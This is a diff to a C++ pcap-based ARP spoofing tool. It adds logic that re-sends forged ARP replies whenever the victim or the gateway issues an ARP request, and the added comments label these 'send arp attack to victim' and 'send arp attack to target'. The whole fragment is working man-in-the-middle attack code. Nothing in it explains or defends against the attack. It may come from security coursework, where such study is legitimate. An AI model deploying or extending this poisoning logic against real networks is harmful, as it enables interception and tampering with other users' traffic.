@@ -153,7 +153,11 @@ int main(int argc, char* argv[]) {
                         sendArp(pcap, my_mac, smacVec[i], ipVec[i].second, ipVec[i].first, my_mac, smacVec[i],ArpHdr::Reply);
                         std::cout << "Sender MAC: " << std::string(smacVec[i]) << std::endl;
                     }
-                }
+		    if(arpHdr->op() == htons(ArpHdr::Request) && arpHdr->tip() == ipVec[i].second){
+                       // send arp attack to victim
+                       sendArp(pcap, my_mac, smacVec[i], ipVec[i].second, ipVec[i].first, my_mac, smacVec[i]);
+		    }
+		}
                 else if(arpHdr->sip() == ipVec[i].second){
                     // get gateway's MAC address
                     if(arpHdr->tip() == my_ip){
@@ -162,6 +166,10 @@ int main(int argc, char* argv[]) {
                         sendArp(pcap, my_mac, tmacVec[i], ipVec[i].first, ipVec[i].second , my_mac, tmacVec[i],ArpHdr::Reply);
                         std::cout << "Target MAC: " << std::string(tmacVec[i]) << std::endl;
                     }
+		    if(arpHdr->op() == htons(ArpHdr::Request) && arpHdr->tip() == ipVec[i].first){
+			    //send arp attack to target
+                    	    sendArp(pcap, my_mac, tmacVec[i], ipVec[i].first, ipVec[i].second , my_mac, tmacVec[i]);
+		    }
                 }
             }
         }
